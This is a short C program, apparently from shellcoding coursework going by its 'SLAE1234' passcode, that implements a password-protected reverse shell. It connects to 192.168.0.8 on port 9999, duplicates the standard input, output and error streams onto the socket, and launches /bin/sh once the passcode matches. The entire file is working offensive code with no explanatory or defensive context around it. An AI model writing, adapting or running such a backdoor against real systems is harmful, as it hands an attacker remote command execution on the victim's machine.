#include <stdio.h> 
#include <unistd.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <string.h>

int sockfd;  // socket file descriptor

struct sockaddr_in addr;  // create a new client 'addr' of the structure 'sockaddr_in'


int main() 
{ 
    // Create a new TCP socket 
    sockfd = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize addr struct to connect back to server 
    addr.sin_family = AF_INET;    // server socket type address family = internet protocol address
    addr.sin_port = htons(9999);    // server listener port, converted to network byte order
    addr.sin_addr.s_addr = inet_addr("192.168.0.8");   // server listener IP, converted to network byte order

    // connect socket for the client in sockaddr struct 
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(sockfd, 0); 
    dup2(sockfd, 1); 
    dup2(sockfd, 2); 

    // Check for a passcode
    char passcode[] = "SLAE1234";
    char password_buffer[16];
    write(sockfd, "Please enter the passcode:\n", 27);
    read(sockfd, password_buffer, 16);

    password_buffer[strcspn(password_buffer, "\n")] = '\0';

    if (strcmp(password_buffer, passcode) == 0)
    {
        write(sockfd, "Access Granted!\n", 16);
        execve("/bin/sh", NULL, NULL);
        close(sockfd); 
    
    } 

    return 0;
}
